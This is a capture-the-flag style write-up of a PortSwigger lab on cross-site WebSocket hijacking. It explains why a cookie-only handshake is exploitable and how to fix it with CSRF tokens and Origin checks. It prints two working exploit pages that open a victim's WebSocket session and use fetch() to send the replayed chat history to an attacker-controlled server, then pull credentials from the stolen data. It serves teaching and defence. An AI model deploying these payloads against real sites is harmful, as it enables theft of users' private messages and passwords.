# Cross-site WebSocket hijacking

**Category:** WebSockets
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

CSRF protection on a WebSocket handshake tends to get overlooked because the handshake doesn't look
like a form submission — it's a GET request with some odd upgrade headers, easy to forget lives in
the same trust model as any other cookie-authenticated request. This lab is what happens when that
gets forgotten: a WebSocket endpoint authenticated purely by session cookie, reachable from any
origin on the internet, replaying a victim's private chat history to whichever page opens the
connection.

## The Target

The same live chat feature as the previous two labs, but the angle here isn't the message content —
it's the handshake itself. Opening the chat and sending `"READY"` as the first message causes the
server to reply with the full chat history for that session, which normally just re-populates the
chat window for a returning user. The question is what authenticates that handshake, and whether
anything ties it to the page that opened it.

## The Investigation

Sending a chat message and reloading the page confirmed the "READY" behavior: the client sends
`"READY"` right after the connection opens, and the server replies with every prior message in that
session's chat history. That's a meaningful data flow — chat history can contain whatever a user has
typed, including anything a support agent has said back to them, which is exactly the kind of thing
that shouldn't be readable by a third party.

Looking at the handshake request itself in the HTTP history showed the only thing authenticating it
was the session cookie — no CSRF token in the URL, no token in a custom header, nothing beyond
`Sec-WebSocket-Key`, which the spec itself states plainly is an anti-caching value, not an
authentication mechanism. A handshake authenticated solely by a cookie is a handshake any origin can
trigger: the browser attaches cookies to a `WebSocket()` constructor call the same way it attaches
them to a normal fetch, regardless of which page's script initiated the connection. That's the
precondition for cross-site WebSocket hijacking — the same underlying gap as CSRF, just on a
different transport.

Proving it meant building the full attack as an attacker actually would: host a page on a different
origin (the lab's exploit server), open a WebSocket connection from it to the vulnerable chat
endpoint, send `"READY"` to trigger the history replay, and forward whatever comes back to
infrastructure we control. We built this as a small exfiltration script embedded in an HTML page:
open the WebSocket, fire `"READY"` on `onopen`, and on every `onmessage` event, `fetch()` the message
content — base64-encoded — to a logging endpoint on the exploit server. Because it's a same-origin
`fetch()` call from the exploit server's own page back to the exploit server's own log endpoint, it
sails through without hitting any cross-origin restriction on the exfiltration side; the only
cross-origin operation in the whole attack is the WebSocket connection itself, and that's the one
the target never validates.

## The Exploit

The exploit page delivered to the victim through the lab's exploit server:

```html
<script>
var ws = new WebSocket('wss://VULNERABLE-HOST/chat');
ws.onopen = function() {
    ws.send('READY');
};
ws.onmessage = function(event) {
    fetch('https://EXPLOIT-SERVER/log?data=' + btoa(event.data));
};
</script>
```

When the victim's browser loads this page, it opens a WebSocket to the vulnerable chat endpoint,
carrying the victim's own session cookie along automatically. The server, seeing a valid session
cookie and nothing checking where the request originated, treats it as a legitimate handshake from
that user. The `"READY"` message triggers the same chat-history replay the legitimate client
triggers, and every message the server sends back gets base64-encoded and shipped off to our exploit
server's `/log` endpoint via `fetch()`.

Pulling the access log off the exploit server after delivering the exploit to the victim surfaced the
base64-encoded chat data. Decoding each logged value and scanning the decoded chat text for a
credential-shaped pattern — the support agent's reply text follows the shape "No problem
`<username>`, it's `<password>`" — pulled out the victim's actual username and password directly
from their exfiltrated chat history. From there, logging in was a normal authenticated POST to
`/login` with the recovered credentials and a freshly fetched CSRF token, which is a static form
field the login page itself requires but that has nothing to do with the WebSocket vulnerability —
solving the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution walks the same underlying vulnerability — no CSRF token on the
handshake, cookie-only authentication, `"READY"` triggering a chat-history replay — through the
lab's built-in exploit-server template rather than a hand-written exfiltration script. Their template
payload is functionally identical in structure to ours but exfiltrates differently:

```
<script>
var ws = new WebSocket('wss://your-websocket-url');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```

The real difference is the exfiltration channel. PortSwigger's solution `POST`s each message
straight to a Burp Collaborator URL and reads the recovered chat data back out of Collaborator's
interaction log — which also means an attacker can watch the exfiltration land in near real time
without needing any infrastructure of their own beyond Burp. We routed exfiltration to the exploit
server's own `/log` endpoint instead, base64-encoding the message into a query parameter and reading
it back by fetching the exploit server's access log directly rather than polling Collaborator. Both
are valid because the vulnerability doesn't care where the stolen data goes — the missing control is
purely on the handshake side, and any origin the victim's browser will run script from, including a
throwaway logging endpoint, works as the exfiltration sink. Collaborator is the more convenient
choice when it's available since it doesn't require standing up any logging logic of your own; our
script needed the extra decode-and-pattern-match step afterward because we were parsing our own log
format instead of Collaborator's ready-made interaction viewer.

## What This Teaches Us

This lab is CSRF's exact reasoning transplanted onto a different transport, and the fix is the same
fix: a WebSocket handshake that performs an authenticated action or returns sensitive data needs
something beyond the ambient session cookie to prove the request came from a page the application
trusts — a CSRF token checked during the handshake, strict `Origin` header validation, or both.
`Sec-WebSocket-Key` looks like it might serve that purpose because it's random and present on every
handshake, but it's generated and validated purely for protocol correctness (proving the client
speaks the WebSocket upgrade dance, and guarding against naive proxy caching) — it carries no secret
tied to the user's session and an attacker's own browser generates a perfectly valid one on every
connection attempt. Once a handshake is cookie-authenticated with no other origin check, anything
that endpoint returns after connecting — chat history, account data, live notifications — is
readable by any site the victim happens to visit while logged in.
